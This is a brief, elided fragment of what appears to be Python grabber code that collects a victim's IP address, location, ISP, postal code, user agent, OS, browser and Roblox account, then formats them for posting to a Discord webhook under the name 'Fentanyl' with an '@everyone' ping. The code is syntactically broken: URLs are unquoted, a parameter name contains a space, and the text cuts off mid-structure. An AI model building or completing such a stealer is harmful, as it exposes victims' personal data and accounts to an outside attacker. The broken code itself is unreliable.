...
webhook = https://discord.gg/znSh5G3JU
bindata = httpx.get(https://storage.ko-fi.com/cdn/useruploads/display/884c0233-1638-48b8-87b6-24f536bbf256_s-l400.jpg
...
def formatHook(ip,city,reg,country,loc,org,postal,useragent,os,browser,roblox account):
    return {
  "username": "Fentanyl",
  "content": "@everyone",
  "embeds": [
